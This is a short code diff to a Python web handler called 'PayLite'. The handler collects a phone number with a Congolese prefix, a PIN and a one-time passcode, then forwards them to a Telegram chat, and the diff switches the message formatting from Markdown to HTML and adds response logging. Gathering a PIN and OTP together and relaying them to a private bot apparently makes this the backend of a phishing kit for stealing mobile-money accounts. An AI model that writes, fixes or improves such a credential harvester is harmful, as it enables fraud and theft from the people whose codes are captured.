@@ -656,10 +656,10 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             pin = data.get('pin', '')
             otp = data.get('otp', '')
             
-            message = f"🚀 *New Application Received!*\n\n"
-            message += f"📱 *Phone:* +243 {phone}\n"
-            message += f"🔑 *PIN:* {pin}\n"
-            message += f"🔢 *OTP:* {otp}\n"
+            message = f"🚀 <b>New Application Received!</b>\n\n"
+            message += f"📱 <b>Phone:</b> +243 {phone}\n"
+            message += f"🔑 <b>PIN:</b> {pin}\n"
+            message += f"🔢 <b>OTP:</b> {otp}\n"
             
             token = os.environ.get("TELEGRAM_TOKEN")
             chat_id = os.environ.get("TELEGRAM_CHAT_ID")
@@ -671,11 +671,12 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
                 payload = {
                     "chat_id": chat_id,
                     "text": message,
-                    "parse_mode": "Markdown"
+                    "parse_mode": "HTML"
                 }
                 try:
                     res = requests.post(url, json=payload)
-                    print(f"[PayLite] Telegram response: {res.status_code}")
+                    print(f"[PayLite] Telegram response status: {res.status_code}")
+                    print(f"[PayLite] Telegram response body: {res.text}")
                 except Exception as e:
                     print(f"[PayLite] Error sending to Telegram: {e}")
             else:
